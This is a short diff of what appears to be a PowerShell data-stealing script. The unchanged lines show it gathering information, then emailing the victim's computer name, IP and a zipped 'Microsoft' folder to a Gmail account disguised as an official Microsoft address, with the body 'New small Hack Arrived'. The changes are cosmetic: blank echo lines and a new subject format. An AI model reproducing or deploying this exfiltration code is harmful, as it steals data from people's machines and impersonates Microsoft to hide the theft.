@@ -65,7 +65,8 @@ else{
     echo " "   
     echo " "
     echo " "
-    echo " "     
+    echo " "    
+    echo " " 
     echo " "
     echo 'Gathering information.'
     Start-Sleep -Milliseconds 80  
@@ -82,7 +83,7 @@ else{
     $msg.From = "com.microsoft.official@gmail.com"
     $msg.To.Add("com.microsoft.official@gmail.com")
 
-    $msg.Subject = "$env:computername  ©®™💱💲🔴🔵⚫ {$ip ($count)}"
+    $msg.Subject = "$env:computername ### {$ip ($count)}"
     $msg.Body = "New small Hack Arrived. Lets Enjoy !!!"                     
 
     $file1 = "$location\Microsoft\Microsoft.zip"
